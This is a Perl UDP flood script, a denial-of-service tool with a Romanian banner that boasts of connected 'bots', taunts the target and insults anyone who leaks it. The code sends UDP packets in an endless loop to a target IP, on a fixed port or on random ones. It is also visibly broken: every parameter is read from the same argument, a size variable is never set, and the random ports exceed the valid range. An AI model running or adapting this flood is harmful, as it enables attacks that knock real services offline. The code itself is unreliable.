#!/usr/bin/perl
use Socket;
$ARGC=@ARGV;
my ($ip,$port,$size,$time);
$ip=$ARGV[0];
$port=$ARGV[0];
$time=$ARGV[0];
socket(crazy, PF_INET, SOCK_DGRAM, 17);
$iaddr = inet_aton("$ip");

printf "[0;36m    
--## ## # # # #-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-# # # # # # #
--## ## # # # # Am Inceput atacul forta-bruta               # # # #                           
--## ## # # # # BOT01 BOT06 BOT11 BOT16 BOT21 BOT26 BOT30 BOT35 BOT40   # # # #                                      
--## ## # # # # BOT02 BOT07 BOT12 BOT17 BOT22 BOT27 BOT31 BOT36 BOT41   # # # #                              
--## ## # # # # BOT03 BOT08 BOT13 BOT18 BOT23 BOT28 BOT32 BOT37 BOT42   # # # #                              
--## ## # # # # BOT04 BOT09 BOT14 BOT19 BOT24 BOT29 BOT33 BOT38 BOT43   # # # #                                 
--## ## # # # # BOT05 BOT10 BOT15 BOT20 BOT25 BOT30 BOT34 BOT39 BOT44   # # # #
--## ## # # # # Botii lui Max s-au conectat cu success             # # # #
--## ## # # # # Spune-ti rugaciunile =]]]                          # # # #
--## ## # # # # Pentru a opri flood-ul apasa ctrl+c                     # # # #
--## ## # # # #-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-# # # # # # #


--## ## # # # #-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-# # # # #
--## ## # # # # ~Arhiva flood by [Dev] Nite Max                           # # # #
--## ## # # # # ~Copyright 2019 [Dev] Nite Max (DO NOT DISTRIBUTE)                                # # # #
--## ## # # # # ~Muie celor care dau leak arhivei                             # # # #                    
--## ## # # # #-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-# # # # #
\n";


if ($ARGV[1] ==0 && $ARGV[2] ==0) {
goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &"); 
goto randpackets;
}
packets:
for (;;) {
$size=$rand x $rand x $rand;
send(crazy, 128, $size, sockaddr_in($port, $iaddr));
}
randpackets:
for (;;) {
$size=$rand x $rand x $rand;
$port=(rand 95000) +1;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}